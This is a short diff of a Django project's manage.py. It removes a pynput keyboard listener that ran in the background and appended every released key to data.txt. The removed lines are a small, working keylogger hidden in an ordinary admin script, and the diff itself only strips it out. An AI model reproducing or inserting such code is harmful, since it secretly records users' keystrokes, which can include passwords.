@@ -2,24 +2,16 @@
 """Django's command-line utility for administrative tasks."""
 import os
 import sys
-from pynput import keyboard
-def on_release(key):
-    print('{0}'.format(key))
-    f = open('data.txt', 'a')
-    f.write(str(key))
-    f.close()
 
-    if key == keyboard.Key.esc:
-        # Stop listener
-        return False
+
+
+
 
 def main():
     
 
     # ...or, in a non-blocking fashion:
-    listener = keyboard.Listener(
-            on_release=on_release)
-    listener.start()
+    
 
     os.environ.setdefault('DJANGO_SETTINGS_MODULE', 'mnm.settings')
     try:
